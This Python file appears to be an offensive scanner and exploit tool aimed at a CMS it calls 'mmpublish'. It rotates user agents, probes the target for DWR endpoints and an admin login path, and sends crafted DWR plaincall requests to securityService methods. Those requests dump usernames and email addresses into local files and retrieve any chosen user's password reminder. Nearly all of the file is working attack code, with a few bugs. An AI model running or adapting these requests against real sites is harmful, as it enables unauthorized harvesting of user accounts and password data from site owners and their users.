#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from random import randint
import urllib3
from txtAndColors import ask, critical, banner, notice, warning, info, vulnerable, display


class Cofe:
    
    def __init__(self, url, max_threads, user_agent):
        self.url = url
        self.agent = user_agent
        self.max_threads = int(max_threads)
        self.CleanUrl()

    """ this methods is used to random the user agent  """
    def RandomAgent(self):
        with open('database/user-agents.txt', 'r') as f:
            uas = f.read()
            uas = re.sub("#.*","", uas)
            uas = uas.replace("\n\n", "")
            uas = uas.split("\n")
           
        random = randint(0, len(uas)-1)
        self.agent = uas[random]

    """ this method set a backslash at the end  """
    def CleanUrl(self):
        if self.url[-1] != '/':
            self.url = self.url + '/'


    def IsMMPub(self):
        self.index = requests.get(self.url, headers={"User-Agent":self.agent}, verify=False)
        # verificar se existe um mmpublish

    
    """ this method verify is a target is up or down based header location.. etc or have a redirect """
    def IsUpOrDown(self):
        try:
            r = requests.get(self.url, allow_redirects=False, headers={"User-Agent":self.agent}, verify=False)
            if 'location' in r.headers:
                print(warning("[+] The website try to redirect.. {}".format(r.headers['location'])))
                userInput = str(input('[+] Do you want to follow the redirect ? [Y]es or [N]o:   '))
                if userInput.lower() == "y":
                    self.url == r.headers['location']
                else:
                    print(notice("[+] Redirection found and not followed ! \n"))
                    exit()
        except Exception as e:
            print(e)
            print("[-] Critical website is down OR you not provide a vile schema from URL ex: http://wwww.foo.com \n")
            exit()


    """ if a target has some robots.txt """
    def IsRobots(self):
        r = requests.get(self.url + "robots.txt", headers={"User-Agent":self.agent}, verify=False)
        if "200" in str(r) and not "404" in r.text:
            print(notice("[+] Robots.txt avaliable under {} \n".format(self.url + "robots.txt")))
            lines = r.text.split('\n')
            for l in lines:
                if "Dissalow" in l:
                    print("[-] \t /interesting entry files in robots.txt ! \n")
    


    """ self explained """
    def ToString(self):
        print(warning("URL : {}".format(self.url)))
        print(warning("Agent: {}".format(self.agent)))



    """ this method is used for search dwr path.. """
    def HaveDWR(self):
        print(info("[+] Finding DWR path \n"))
        r = requests.get(self.url+"dwr/", headers={"User-Agent":self.agent}, verify=False)
        if "200" in str(r) and not "404" in r.text:
            print(vulnerable(" [+] Critical! Find DWR PATH: {}".format(self.url+"dwr")))

    
    """ this path is usually found .. """
    def HaveDWRView(self):
        print(info(("[+] Finding Other dwr path")))
        r = requests.get(self.url+"dwr-view/", headers={"User-Agent":self.agent}, verify=False)
        if '200' in str(r) and not '404' in r.text:
            print(vulnerable(" [+] Critical! FIND DWR-VIEW PATH: {}").format(self.url+"dwr-view"))



    """ this method is used to findo some dwr scripts  """
    def SearchDWRScripts(self):
        with open('database/dwr-scripts-paths.txt', 'r') as f:
            print(info("[+] Finding for DWR scripts.."))
            for line in f.readlines():
                requestUrl = self.url+line.rstrip()
                try:
                    r = requests.get(requestUrl, headers={"User-Agent":self.agent}, verify=False, timeout=5)
                    if "200" in str(r) and not "404" in r.text:
                        print("[+] Found DWR SCRIPTS: {}".format(self.url+line))
                except Exception as e:
                    print(e)
                    print(warning("[-] Timeout reached ! / maybe a WAF dropping malicious requests.. \n"))
                    continue
                
    """ the of admin page { always has the path  } """
    def GetAdminLogin(self):
        r = requests.get(self.url+"admin/admin.login.action", headers={"User-Agent":self.agent}, verify=False)
        if "200" in str(r) and not "404" in r.text:
            print(critical("[+] ADMIN path found: {} \n".format(self.url+"admin/admin.login.action")))



    """  send exploit to get LOGINS and save on a file  """
    def XptGetUsersLogin(self):
        exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
        "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", headers={'User-Agent':self.agent}, data=exploit, verify=False)
        #print(r.text)
        if "200" in str(r) and not "404" in r.text:
            print(vulnerable("[+] Getting Possible logins... \n"))
            f = open('./users-file.txt', 'w')
            for m in re.findall(r'name="(\w*)"', r.text):
                print("[+] Possible user: {}".format(str(m)))
                f.write(m+"\n")
        print(notice("[+] Finish all possible logins were got.. \n"))
        print(notice("[+] created a file.. ( user-file.txt ) with all users collected \n"))
        f.close()    


    """  send exploit to get EMAILS and save on a file  """
    def xpltUserEmail(self):
        exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
        "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, headers={'User-Agent':self.agent}, verify=False)
        f = open('./mails-file.txt', 'w')
        if "200" in str(r) and not "404" in r.text:
            print(vulnerable("\n[+] Getting Emails... \n"))
            for m in re.findall(r'email="([\w\.-]+@[\w\.-]+)"', r.text):
                print("[+] Possible email: {}".format(str(m)))
                f.write(m+"\n")
        print(notice("[+] Finish all possible mails were got.. \n"))
        print(notice("[+] created a file.. ( mails-file.txt ) with all emails collected \n"))
        f.close()


    def XptGetURemainder(self):
        exploit = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
        "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:admin","batchId":'2'}
        r = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)
        if "200" in str(r) and not "404" in r.text:
            remainderUser = input("[+] Type the user to get ther password Remainder:  ").lower()
            xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
            "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
            r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", headers={'User-Agent':self.agent}, data=xpltUser, verify=False)
            if "200" in str(2) and not "404" in r.text:
                print(r2.text)


    




